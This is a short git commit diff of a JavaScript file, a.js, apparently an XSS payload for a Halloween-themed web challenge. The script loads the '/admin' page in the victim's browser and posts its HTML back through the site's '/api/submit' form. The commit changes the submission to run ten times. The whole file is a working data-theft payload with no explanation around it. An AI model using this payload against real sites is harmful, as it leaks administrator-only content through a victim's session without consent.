2f50e97ba48e5cb802508c449306c36219261b02
Muhammed Efe Erdoğan <efeyedek107@gmail.com>
2026-04-27 14:35:05 +0300

    Update a.js

--- a.js
+++ a.js
@@ -1,3 +1,5 @@
 fetch('/admin').then(r=>r.text()).then(html=>{
-  fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:html,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
+  for(let i=0;i<10;i++){
+    fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:html,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
+  }
 });
